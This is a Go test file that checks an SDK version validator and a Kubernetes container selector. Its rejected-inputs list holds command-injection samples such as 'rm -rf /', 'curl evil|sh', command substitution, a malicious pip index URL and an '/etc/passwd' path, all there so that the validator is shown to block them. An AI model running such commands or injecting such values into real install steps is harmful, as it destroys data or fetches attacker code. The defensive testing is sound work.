package engine

import "testing"

func TestIsValidSDKVersion(t *testing.T) {
	valid := []string{
		"", // empty == latest
		"1.34.0",
		"1.34.0rc1",
		"1.34.0.post1",
		"1.34.0+local.1",
		"2024.1",
		"1_2_3",
	}
	for _, v := range valid {
		if !isValidSDKVersion(v) {
			t.Errorf("expected %q to be valid", v)
		}
	}

	// Anything that could break out of `openlit==<v>` in a shell or pip arg.
	invalid := []string{
		"1.0.0; rm -rf /",
		"1.0.0 && curl evil|sh",
		"1.0.0`whoami`",
		"$(id)",
		"1.0.0\nmalicious",
		"1.0.0 --extra-index-url=http://evil",
		"../../etc/passwd",
		"openlit; pip install evil",
		"-rfoo",   // leading dash (pip option injection)
		".hidden", // must start alnum
	}
	for _, v := range invalid {
		if isValidSDKVersion(v) {
			t.Errorf("expected %q to be REJECTED", v)
		}
	}
}

func TestPypiPackageSpecNeverInjects(t *testing.T) {
	// An invalid version must never produce an injectable spec.
	if got := pypiPackageSpec("1.0.0; rm -rf /"); got != "openlit" {
		t.Fatalf("invalid version leaked into spec: %q", got)
	}
	if got := pypiPackageSpec("1.34.0"); got != "openlit==1.34.0" {
		t.Fatalf("valid version spec wrong: %q", got)
	}
	if got := pypiPackageSpec(""); got != "openlit" {
		t.Fatalf("empty spec wrong: %q", got)
	}
}

func TestSelectContainerIndexNoSilentFallback(t *testing.T) {
	two := []map[string]any{{"name": "app"}, {"name": "sidecar"}}
	// A specified-but-unmatched name must error, NOT fall back to index 0.
	if _, err := selectContainerIndex(two, "missing"); err == nil {
		t.Fatal("expected error for unmatched container name in multi-container pod")
	}
	one := []map[string]any{{"name": "only"}}
	// Single container with a wrong name still must not be assumed.
	if _, err := selectContainerIndex(one, "wrongname"); err == nil {
		t.Fatal("expected error for unmatched name even in single-container pod")
	}
	// Exact match works.
	if idx, err := selectContainerIndex(two, "sidecar"); err != nil || idx != 1 {
		t.Fatalf("expected idx=1, got idx=%d err=%v", idx, err)
	}
	// Empty name + single container is the one allowed implicit case.
	if idx, err := selectContainerIndex(one, ""); err != nil || idx != 0 {
		t.Fatalf("expected idx=0 for empty name single container, got %d err=%v", idx, err)
	}
	// Empty name + multiple containers is ambiguous → error.
	if _, err := selectContainerIndex(two, ""); err == nil {
		t.Fatal("expected error for empty name with multiple containers")
	}
}
